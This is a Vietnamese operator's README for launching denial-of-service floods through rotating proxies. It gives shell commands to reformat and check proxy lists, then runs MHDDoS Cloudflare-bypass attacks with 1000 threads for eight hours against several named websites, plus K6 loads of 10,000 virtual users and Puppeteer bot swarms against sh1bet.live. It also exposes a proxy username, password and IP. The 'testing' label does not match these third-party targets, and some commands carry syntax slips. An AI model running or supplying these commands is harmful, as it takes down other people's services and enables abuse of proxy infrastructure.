# 🛡️ Hướng dẫn sử dụng Proxy và công cụ kiểm thử MHDDoS / K6 / Puppeteer

## 1️⃣ Thay đổi định dạng chuỗi Proxy

### ➕ Thêm `http://` vào đầu mỗi dòng:

```bash
sed -i 's|^|http://|' proxies.txt`
```

### 🔄 Chuyển định dạng để kiểm tra proxy còn sống:

```bash
awk -F: '{print "http://" $3 ":" $4 "@" $1 ":" $2}' proxies_input.txt > proxies_tmp.txt
mv proxies_tmp.txt proxies_input.txt`
```

### 🧩 Chuyển sang định dạng phù hợp với **MHDDoS**:

```bash
awk '
/@/ {
match($0, /http:\/\/([^:]+):([^@]+)@([^:]+):([0-9]+)/, arr)
if (arr[1] && arr[2] && arr[3] && arr[4]) {
print "http://" arr[3] ":" arr[4] ":" arr[1] ":" arr[2]
} else {
print "# Lỗi: " $0
}
}
/@/! {
print $0
}
' proxies.txt > proxies_fixed.txt
mv proxies_fixed.txt proxies.txt
```

---

## 2️⃣ Kiểm tra Proxy còn sống

```bash
parallel -j 100 '
  if curl --proxy {} --max-time 5 -s https://httpbin.org/ip > /dev/null; then
    echo {} >> proxies_live.txt
    echo "✅ {}"
  else
    echo {} >> proxies_dead.txt
    echo "❌ {}"
  fi
' :::: proxies_input.txt
```

## 3️⃣ Lọc trùng các Proxy sống

```bash
sort -u proxies_live.txt -o proxies_live.txt
```

---

## 4️⃣ Cập nhật danh sách Proxy sống

```bash
mv proxies_live.txt proxies.txt
```

---

## 5️⃣ 🧨 MHDDoS

📁 Chuyển thư mục:
```bash
cd MHDDoS
```
### ▶️ Ví dụ lệnh chạy:

```bash
nohup python3 start.py CFB https://skyxtoken.io/ 1 1000 proxies.txt 120 28800 >/dev/null 2>&1 &
nohup python3 start.py CFB https://sh1bet.live/ 1 1000 proxies.txt 70 28800 >/dev/null 2>&1 &
nohup python3 start.py CFB https://solnic.io/ 1 1000 proxies.txt 70 28800 >/dev/null 2>&1 &
```

---

## 6️⃣ 🧪 K6

📁 Chuyển thư mục:

```bash
cd bot`
```
> ⚙️ Cấu hình trong file `run.sh`, đảm bảo file `proxies_k6.txt` đúng định dạng

### ▶️ Ví dụ test đơn:

```bash
export HTTP_PROXY="http://ugbp7v4r:uGbP7v4R@103.151.122.165:20211"

k6 run test.js
-e BASE_URL="https://sh1bet.live/"\
-e VUS=10000\
-e DURATION="10m"
```

### ▶️ Ví dụ chạy hàng loạt:

```bash
./run_k6.sh
```

---

## 7️⃣ 🕵️ Puppeteer

📁 Chuyển thư mục:

```bash
cd bot
```

> ⚙️ Kiểm tra file `proxies.txt`

### ▶️ Ví dụ test đơn:

```bash
node main.js 10 https://sh1bet.live 30
```

### ▶️ Ví dụ chạy hàng loạt:

```bash
nohup node main.js 100 https://sh1bet.live 28800 >/dev/null 2>&1 &
```

---

## 🛑 Dừng khẩn cấp

| Công cụ   | Lệnh dừng           |
| --------- | ------------------- |
| MHDDoS    | `pkill -f start.py` |
| K6        | `pkill -f k6`       |
| Puppeteer | `pkill node`        |
